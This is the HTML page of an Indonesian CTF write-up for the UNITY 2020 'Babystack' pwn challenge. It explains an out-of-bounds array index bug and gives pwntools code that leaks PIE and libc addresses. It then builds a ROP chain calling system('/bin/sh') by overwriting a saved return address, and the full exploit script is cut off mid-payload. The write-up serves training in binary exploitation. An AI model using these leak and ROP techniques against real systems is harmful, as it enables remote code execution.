@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Bintang Fikriguska ">
+<meta name="description" content="hint:
+overwriting return address by overflowing the boundary Diberikan file ELF dengan proteksi sebagai berikut:
+@m00n ➜ babystack git:(master) ✗ checksec main [*] &amp;#39;/home/bintang/CTF/unity2020/pwn/babystack/main&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:
+__int64 __fastcall add_book(__int64 a1) { signed int v2; // [rsp&#43;1Ch] [rbp-4h]  printf(&amp;#34;Enter index : &amp;#34;); v2 = read_int(&amp;#34;Enter index : &amp;#34;); if ( v2 &amp;gt; 7 ) printf(&amp;#34;not for OOB\b&amp;#34;); printf(&amp;#34;Enter the name of Books : &amp;#34;); return read_wrapper(30LL * v2 &#43; a1, 29LL); } Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu." />
+<meta name="keywords" content=", writeup, pwn" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://fikriguska.github.io/posts/2020/03/unity-2020-babystack/" />
+
+
+    <title>
+        
+            UNITY 2020 - Babystack :: Camelliose  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet" type="text/css">
+
+
+
+<link rel="stylesheet" href="https://fikriguska.github.io/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://fikriguska.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://fikriguska.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://fikriguska.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://fikriguska.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://fikriguska.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://fikriguska.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="UNITY 2020 - Babystack">
+<meta itemprop="description" content="hint:
+overwriting return address by overflowing the boundary Diberikan file ELF dengan proteksi sebagai berikut:
+@m00n ➜ babystack git:(master) ✗ checksec main [*] &#39;/home/bintang/CTF/unity2020/pwn/babystack/main&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:
+__int64 __fastcall add_book(__int64 a1) { signed int v2; // [rsp&#43;1Ch] [rbp-4h]  printf(&#34;Enter index : &#34;); v2 = read_int(&#34;Enter index : &#34;); if ( v2 &gt; 7 ) printf(&#34;not for OOB\b&#34;); printf(&#34;Enter the name of Books : &#34;); return read_wrapper(30LL * v2 &#43; a1, 29LL); } Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu.">
+<meta itemprop="datePublished" content="2020-03-17T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-03-17T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="926">
+<meta itemprop="image" content="https://fikriguska.github.io"/>
+
+
+
+<meta itemprop="keywords" content="writeup,pwn," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fikriguska.github.io"/>
+
+<meta name="twitter:title" content="UNITY 2020 - Babystack"/>
+<meta name="twitter:description" content="hint:
+overwriting return address by overflowing the boundary Diberikan file ELF dengan proteksi sebagai berikut:
+@m00n ➜ babystack git:(master) ✗ checksec main [*] &#39;/home/bintang/CTF/unity2020/pwn/babystack/main&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:
+__int64 __fastcall add_book(__int64 a1) { signed int v2; // [rsp&#43;1Ch] [rbp-4h]  printf(&#34;Enter index : &#34;); v2 = read_int(&#34;Enter index : &#34;); if ( v2 &gt; 7 ) printf(&#34;not for OOB\b&#34;); printf(&#34;Enter the name of Books : &#34;); return read_wrapper(30LL * v2 &#43; a1, 29LL); } Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu."/>
+
+
+
+    <meta property="og:title" content="UNITY 2020 - Babystack" />
+<meta property="og:description" content="hint:
+overwriting return address by overflowing the boundary Diberikan file ELF dengan proteksi sebagai berikut:
+@m00n ➜ babystack git:(master) ✗ checksec main [*] &#39;/home/bintang/CTF/unity2020/pwn/babystack/main&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:
+__int64 __fastcall add_book(__int64 a1) { signed int v2; // [rsp&#43;1Ch] [rbp-4h]  printf(&#34;Enter index : &#34;); v2 = read_int(&#34;Enter index : &#34;); if ( v2 &gt; 7 ) printf(&#34;not for OOB\b&#34;); printf(&#34;Enter the name of Books : &#34;); return read_wrapper(30LL * v2 &#43; a1, 29LL); } Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fikriguska.github.io/posts/2020/03/unity-2020-babystack/" />
+<meta property="og:image" content="https://fikriguska.github.io"/>
+<meta property="article:published_time" content="2020-03-17T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-03-17T00:00:00+00:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-03-17 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://fikriguska.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">~</span>
+            
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://fikriguska.github.io/about/">About</a></li><li><a href="https://fikriguska.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+            <span class="theme-toggle unselectable"></span>
+
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<style>
+.post-content .img{
+	text-align: center;
+}
+</style>
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article style="text-align: justify">
+            <h1 class="post-title">
+                <a href="https://fikriguska.github.io/posts/2020/03/unity-2020-babystack/">UNITY 2020 - Babystack</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <p>hint:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">overwriting return address by overflowing the boundary
+</code></pre></div><p>Diberikan file ELF dengan proteksi sebagai berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">@m00n ➜ babystack git:(master) ✗ checksec main
+[*] &#39;/home/bintang/CTF/unity2020/pwn/babystack/main&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div><p>ELF tersebut menggunakan libc 2.23 dan memiliki vulnerability Out of Bond (OOB), Berikut fungsi yang memiliki vulnerability tersebut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">add_book</span>(<span style="color:#66d9ef">__int64</span> a1)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Enter index : &#34;</span>);
+  v2 <span style="color:#f92672">=</span> read_int(<span style="color:#e6db74">&#34;Enter index : &#34;</span>);
+  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7</span> )
+    printf(<span style="color:#e6db74">&#34;not for OOB</span><span style="color:#ae81ff">\b</span><span style="color:#e6db74">&#34;</span>);
+  printf(<span style="color:#e6db74">&#34;Enter the name of Books : &#34;</span>);
+  <span style="color:#66d9ef">return</span> read_wrapper(<span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1, <span style="color:#ae81ff">29LL</span>);
+}
+</code></pre></div><p>Program tersebut dapat mengoverwrite array dengan index kurang dari 0 atau lebih dari 7 sehingga kita bisa mengoverwrite sesuatu. Tapi overwrite kemana? fungsi main tidak akan pernah melakukan return, karena adanya fungsi <code>exit(1)</code> jika ingin keluar. Berikut adalah fungsi <code>main</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>v3; <span style="color:#75715e">// rdi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// [rsp-108h] [rbp-108h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp-100h] [rbp-100h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp-F8h] [rbp-F8h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// [rsp-F0h] [rbp-F0h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v9; <span style="color:#75715e">// [rsp-ECh] [rbp-ECh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [rsp-EAh] [rbp-EAh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v11; <span style="color:#75715e">// [rsp-E2h] [rbp-E2h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> v12; <span style="color:#75715e">// [rsp-DAh] [rbp-DAh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// [rsp-D2h] [rbp-D2h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v14; <span style="color:#75715e">// [rsp-CEh] [rbp-CEh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// [rsp-10h] [rbp-10h]
+</span><span style="color:#75715e"></span>
+  v15 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  setvbuf(_bss_start, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+  memset(<span style="color:#f92672">&amp;</span>v5, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xF0uLL</span>);
+  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8297711242406229317LL</span>;
+  v6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8389754676365247776LL</span>;
+  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8026900115340861555LL</span>;
+  v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1920230765</span>;
+  v9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">121</span>;
+  v3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">2337214414269147508LL</span>;
+  v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">7166744811854392905LL</span>;
+  v11 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2337214414269147508LL</span>;
+  v12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4692876574359185740LL</span>;
+  v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1650812780</span>;
+  v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">114</span>;
+  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+  {
+    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+    {
+      <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+      {
+        menu(v3);
+        v4 <span style="color:#f92672">=</span> read_int(v3);
+        <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
+          <span style="color:#66d9ef">break</span>;
+        v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+        print_book(<span style="color:#f92672">&amp;</span>v5);
+      }
+      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> )
+        <span style="color:#66d9ef">break</span>;
+      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+        <span style="color:#66d9ef">goto</span> LABEL_13;
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+      list_book(<span style="color:#f92672">&amp;</span>v5);
+    }
+    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
+    {
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+      add_book((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v5);
+    }
+    <span style="color:#66d9ef">else</span>
+    {
+      <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
+      {
+LABEL_13:
+        puts(<span style="color:#e6db74">&#34;Bye&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>); <span style="color:#75715e">/* tidak akan pernah return */</span>
+      }
+      v3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5;
+      remove_book(<span style="color:#f92672">&amp;</span>v5);
+    }
+  }
+}
+</code></pre></div><p>Kita tidak akan bisa mengontrol saved RIP fungsi <code>main</code>. Namun kita bisa mengoverwrite saved RIP fungsi lain, bagaimana caranya? yaitu dengan menggunakan index kurang dari 0. Jika fungsi <code>main</code> memanggil fungsi yang lain, stack frame fungsi main akan berada dibawah fungsi yang dipanggil (walaupun sebenarnya alamat stack frame fungsi <code>main</code> lebih tinggi dari fungsi yang dipanggil). Karena itulah kita menggunakan index kurang dari 0 untuk mengoverwrite saved RIP.
+Agar mempermudah, berikut beberapa fungsi yang dibuat:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>(index):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(index, name):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+	p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, name)
+</code></pre></div><h2 id="leak">#leak</h2>
+<p>Cara yang saya gunakan adalah dengan memasukkan padding pada index ke 8 sebanyak 16 untuk leak PIE dan 24 untuk leak libc. Padding tersebut tidak boleh terdapat <code>'\n'</code>, karena karakter <code>'\n'</code> akan diubah menjadi NULL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">read_wrapper</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>a1, <span style="color:#66d9ef">int</span> a2)
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
+</span><span style="color:#75715e"></span>
+  v3 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, a1, a2);
+  <span style="color:#66d9ef">if</span> ( (v3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x80000000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
+  {
+    puts(<span style="color:#e6db74">&#34;Read Error&#34;</span>);
+    exit(<span style="color:#ae81ff">1</span>);
+  }
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> )
+    <span style="color:#f92672">*</span>((_BYTE <span style="color:#f92672">*</span>)a1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)v3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">/* akan diganti dengan NULL */</span>
+  <span style="color:#66d9ef">return</span> v3;
+}
+</code></pre></div><p>Jika kita menggunakan <code>'\n'</code>, kita tidak akan bisa meleak karena <code>printf()</code> akan mencetak output sampai ditemukannya NULL. Berikut fungsi <code>print_book</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_book</span>(<span style="color:#66d9ef">__int64</span> a1)
+{
+  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Enter index : &#34;</span>);
+  v2 <span style="color:#f92672">=</span> read_int();
+  printf(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v2);
+  <span style="color:#66d9ef">if</span> ( v2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7</span> )
+    puts(<span style="color:#e6db74">&#34;not for OOB&#34;</span>);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1) )
+    result <span style="color:#f92672">=</span> printf(<span style="color:#e6db74">&#34;%d. %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v2, a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">30LL</span> <span style="color:#f92672">*</span> v2);
+  <span style="color:#66d9ef">else</span>
+    result <span style="color:#f92672">=</span> printf(<span style="color:#e6db74">&#34;%d. (empty)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v2);
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>berikut kode untuk leaknya:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+print_(<span style="color:#ae81ff">8</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">16</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+pie <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xd90</span>
+
+add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>)
+print_(<span style="color:#ae81ff">8</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">24</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20830</span>
+</code></pre></div><h2 id="shell">#shell</h2>
+<p>Agar bisa mendapatkan shell ada beberapa kemungkinan exploit yang digunakan, antara lain menggunakan one gadget atau jump ke <code>system(&quot;/bin/sh&quot;)</code>. Namun saya telah mencoba untuk menggunakan one gadget tetapi tidak bisa, jadi saya menggunakan alternatif lain yaitu jump ke <code>system(&quot;/bin/sh&quot;)</code>. Saya menggunakan ROP chain yang ditempatkan di index -3 dan akan mengoverwrite saved RIP dari fungsi <code>read_wrapper</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#75715e"># padding</span>
+payload <span style="color:#f92672">+=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000df3</span>) <span style="color:#75715e"># pop rdi; ret;</span>
+payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)))
+payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
+add(<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>, payload)
+</code></pre></div><p>berikut full exploitnya:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./main&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc 35.192.113.20 3000&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+	con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+	HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+	PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;gnome-terminal -e&#39;</span><span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_</span>(index):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(index, name):
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;index : &#39;</span>, str(index))
+	p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+	add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+	print_(<span style="color:#ae81ff">8</span>)
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+	leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">16</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+	pie <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xd90</span>
+
+	add(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>)
+	print_(<span style="color:#ae81ff">8</span>)
+	p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;. &#39;</span>)
+	leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">24</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+	libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20830</span>
+
+	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+	payload <span style="color:#f92672">+=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000df3</span>)
